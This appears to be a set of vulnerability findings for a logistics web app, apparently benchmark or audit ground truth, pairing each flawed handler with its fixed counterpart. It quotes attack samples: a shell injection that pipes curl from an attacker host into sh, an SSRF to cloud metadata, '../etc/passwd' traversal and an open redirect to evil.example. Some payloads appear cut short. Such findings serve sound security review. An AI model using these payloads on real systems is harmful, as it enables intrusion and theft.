extra.message: searchJobsAdvanced builds a SQL WHERE clause by concatenating attacker-controlled column names and values from the request body ('${col} = \'${val}\'') and executes it via db.execute(dsql.raw(...)). Any ops_admin/dispatcher can inject arbitrary SQL (e.g. {"id":"1 OR 1=1; ..."}) for full database compromise. Route: POST /api/jobs/advanced-search. The /advanced-search-safe variant shows the intended parameterized implementation.

searchCustomerDirectory concatenates the unvalidated 'q' query parameter into an ILIKE pattern and the 'sort' query parameter directly into ORDER BY inside sql.raw(...). Both are SQL injection. Route: GET /api/customers/search (ops_admin/dispatcher). searchCustomerDirectorySafe is the parameterized/allow-listed counterpart.

convertCustomerStatementFormat passes the unvalidated 'format' query parameter straight into a shell command string: execAsync(`pandoc ${srcFile} -f html -t ${format} -o ${outFile}`). An authenticated ops_admin/dispatcher can achieve remote code execution via format payloads such as 'pdf; curl <attacker>|<sh>; #'. Route: POST /api/data/export/customer/:id/statement-convert. The '-safe' endpoint (execFile + allowlist) is the intended fix.

renderReportToPdf builds `wkhtmltopdf --title "${template}" reports/${template}.html ${outFile}` and spawns it with shell:true. The 'template' query parameter is not validated, so an authenticated ops_admin/dispatcher can inject shell commands and execute arbitrary code on the server (RCE). Route: GET /api/reports/render. renderReportToPdfSafe (allowlist + shell:false) is the intended fix.

previewShipmentQuote evaluates the attacker-supplied 'customFormula' query parameter with new Function('base','weightKg','distanceKm', `return (${q.customFormula});`), giving any ops_admin/dispatcher arbitrary JavaScript execution on the server. Route: POST /api/reports/quote-preview. previewShipmentQuoteSafe (formula allowlist) is the intended fix.

getRouteManifestEntry interpolates the raw 'x-shipment-code' header into an XPath predicate that is later executed as JavaScript by new Function in lib/manifestQuery.ts loadRouteManifest().find(). A single-quote payload (e.g. ' ] || <arbitrary JS> || [') breaks out of the predicate string and executes arbitrary code on the server. Route: GET /api/routes/:id/manifest/lookup (any authenticated user with access to the route, including field workers). getRouteManifestEntrySecure (escapeXPathString) is the intended fix.

fetchStatementLayoutSource builds path.join(STATEMENT_LAYOUT_DIR, `${layoutName}.html`) from the unvalidated 'layout' query parameter and returns the file contents. An ops_admin can use ../ sequences to read arbitrary .html files anywhere on the server filesystem. Route: GET /api/reports/statement-layout. fetchStatementLayoutSourceSafe resolves and constrains the path to the layouts directory.

getTrainingMaterial joins the route parameter 'courseName' directly into path.join(TRAINING_MATERIALS_DIR, `${courseName}.pdf`) and reads it from disk. Fastify percent-decodes route params, so a courseName of '..%2F..%2F..%2Fetc%2Fpasswd%00' style payloads traverse out of the training-materials directory to read arbitrary .pdf files (or any file the service user can read). Route: GET /api/workforce/:workerId/training/:courseName. getTrainingMaterialSafe (path.basename) is the intended fix.

archiveRouteManifest writes a CSV file to path.join(ARCHIVE_DIR, `${body.data.tag}.csv`) where 'tag' is a fully attacker-controlled body field (up to 200 chars, no sanitization). A dispatcher can supply a tag like '../../public/shell' or an absolute traversal to write/overwrite arbitrary .csv files anywhere the process can write. archiveCompletionDigest demonstrates the intended mitigation (path.basename).

parseCarrierManifest (used by GET /api/routes/:id/carrier-manifest/items after POST /api/routes/:id/carrier-manifest stores the XML) expands DOCTYPE-declared entities and, for SYSTEM entities, performs fs.readFileSync(systemPath) on an attacker-controlled path and embeds the file contents into the parsed item list returned to the client. An authenticated user with route access can submit a manifest such as ]>&x; to read arbitrary local files (XXE / arbitrary file disclosure). parseCarrierManifestStrict rejects DOCTYPE declarations and is the intended fix.

openScopedPortalSession issues session tokens as a trivially predictable sequential counter: `cps-${(++scopedPortalSequence).toString(36)}` (cps-1, cps-2, ...). Tokens are handed out by POST /api/partners/sessions/scoped (and /onboard). An attacker can enumerate and guess active tokens of any carrier, impersonate that carrier's portal session, and call closeCarrierPortalSession to log them out. The legacy openPortalSession correctly uses crypto.randomBytes(32).

cwe: CWE-330: Use of Insufficiently Random Values

extra.message: fetchManifestExportForLegacyCarrier calls readManifestExportLink(code, { skipSignatureCheck: true }) on the unauthenticated GET /api/partners/manifest-export/:code route. readManifestExportLink then accepts ANY base64url-encoded JSON payload that merely has a future 'exp' field, so an attacker can forge links for arbitrary routeIds (e.g. {"routeId":<n>,"carrierAccountId":1,"exp":<now+>}.x) and read any route's manifest stops with no authentication. The /current endpoint, which verifies the HMAC, is the intended fix.

cwe: CWE-347: Improper Verification of Cryptographic Signature

extra.message: getCarrierPortalRoutes (and getCarrierPortalRoutesScoped at line 135) return every route in the organisation for any valid carrier-portal session, because the 'scope' query is a no-op: where(eq(schema.routes.name, schema.routes.name)) selects all rows. Carrier accounts are self-registered via the public POST /api/partners/register endpoint, so any attacker who registers can list all internal routes (worker assignments, region, dates) via GET /api/partners/routes.

cwe: CWE-639: Authorization Bypass Through User-Controlled Key

extra.message: getJobMessageById fetches a message purely by numeric id (GET /api/jobs/messages/:messageId) without verifying the caller can access the parent job (unlike every other message handler, which goes through getAccessibleJob). Any authenticated user - including a customer or an unrelated field worker - can enumerate message ids and read arbitrary internal/customer messages across all jobs, including internal-only notes.

cwe: CWE-639: Authorization Bypass Through User-Controlled Key

extra.message: getJobMessageThread (GET /api/jobs/:id/messages) only filters out internal (customerVisible=false) messages when the caller does NOT pass 'sharingMode=full'. Any caller who can access the job - including the job's own customer and field workers - can pass ?sharingMode=full and read the full thread including internal-only staff messages. getJobMessageThreadScoped (/messages-scoped) correctly hides internal messages from non-staff via canSeeInternal().

resumeJobDraft (POST /api/jobs/draft-resume) spreads an arbitrary parsed JSON 'draft' object directly into the jobs INSERT (reference: genRef(), ...draft, createdBy: user.id). A dispatcher can set any job column they want - status: 'completed' (bypassing workflow/proof rules), assignedWorkerId, customerId, regionId outside their scope, routeId, etc. resumeJobDraftSafe validates the draft against jobDraftSchema and is the intended fix.

cwe: CWE-915: Improperly Controlled Modification of Dynamically-Determined Object Attributes

extra.message: applyRouteSheetCorrection (POST /api/jobs/:id/route-sheet-correction) copies every field of the request body into the jobs UPDATE set() (patch[key] = fields[key] for all keys). A dispatcher can modify any column of a job, e.g. set status to 'completed' without proof, reassign workers, or change customerId/regionId. applyRouteSheetCorrectionSafe restricts writes to the ROUTE_SHEET_EDITABLE_FIELDS allowlist.

cwe: CWE-915: Improperly Controlled Modification of Dynamically-Determined Object Attributes

extra.message: syncKioskJobUpdate (PATCH /api/kiosk/jobs/:id/sync) merges the entire request body into the job row (Object.assign({}, job, req.body)) and persists it. A badged-in field worker can overwrite arbitrary columns of an assigned job - including status 'completed' (bypassing proof/transition checks), assignedWorkerId, routeId and scheduled times - going far beyond the status/description updates the kiosk is meant to make. syncKioskJobUpdateSafe validates against kioskJobPatchSchema.

cwe: CWE-915: Improperly Controlled Modification of Dynamically-Determined Object Attributes

extra.message: getKioskRoutePreviewTile (unauthenticated GET /api/kiosk/route-preview-tile) fetches whatever URL is stored in the client-controlled 'kiosk_map_provider' cookie (set by the equally unauthenticated POST /api/kiosk/boot, which accepts any z.string().url() mapProviderUrl, or simply forged by the caller) and returns the response body to the caller. This is a full unauthenticated SSRF allowing the server to fetch internal/cloud-metadata URLs (e.g. http://169.254.169.254/...) and disclose their contents. getKioskRoutePreviewTileSafe restricts the hostname to an allowlist.

completeKioskBadgeInFlow (unauthenticated POST /api/kiosk/badge-in/continue) redirects to whatever value is in the attacker-controlled 'next_screen' cookie without any validation or session check. An attacker can set next_screen=https://evil.example and turn this endpoint into an open redirect for phishing. completeKioskBadgeInFlowSafe restricts the destination to ALLOWED_KIOSK_SCREENS.

uploadCarrierPortalLogo (unauthenticated POST /api/partners/accounts/:accountId/logo) accepts an arbitrary file with no authentication, no MIME/content validation and no per-file size cap, keeps the attacker-controlled extension (path.extname(data.filename)) and writes attacker-controlled bytes into the web-visible ./public/carrier-logos directory, allowing arbitrary-content overwrite of any carrier's logo file (e.g. HTML/SVG stagers if the dir is statically served by a proxy). uploadCarrierPortalLogoSafe shows the intended controls: MIME allowlist, size cap, random filename, private directory.

cwe: CWE-434: Unrestricted Upload of File with Dangerous Type

extra.message: registerCarrierPortalAccount stores carrier passwords as a plain unsalted SHA-256 digest (crypto.createHash('sha256').update(password).digest('hex')), and reopenCarrierPortalSession (line 102) verifies against it. Unsalted fast hashes allow offline brute-force/cracking of leaked password hashes. The '/onboard' and scoped-session flows correctly use bcrypt.hash(password, 12).

cwe: CWE-916: Use of Password Hash With Insufficient Computational Effort

extra.message: POST /api/auth/driver-access-assistance is supposed to restore a field worker's access by confirming their driver's licence number matches the value in the worker's background-check file, but the submitted 'licenceNumber' is never compared to the stored driverLicenseNumber (only its mere existence is checked). Any unauthenticated attacker who knows a field worker's email address can present any licence value and receive a valid JWT for that worker's account.

replyStagerWidget(body) builds an HTML string that embeds a message body into an inline onclick attribute with NO HTML/attribute escaping, and the result is injected via v-html at line 210. Message bodies are attacker-controlled (any user who can access the job - e.g. a customer - can post messages). A body like '">' breaks out of the attribute and executes in the dispatcher/admin browser, enabling stored XSS and theft of the JWT held in localStorage.

getCarrierRateExceptions returns (err as Error).stack to the client unconditionally in its error path, leaking internal stack traces, file paths and possibly secrets to any authenticated user (route only requires authenticate, so customers can reach it too). getCarrierIntegrationHealthSafe shows the intended behaviour of only exposing stack details when NODE_ENV=development.

cwe: CWE-209: Information Exposure Through an Error Message
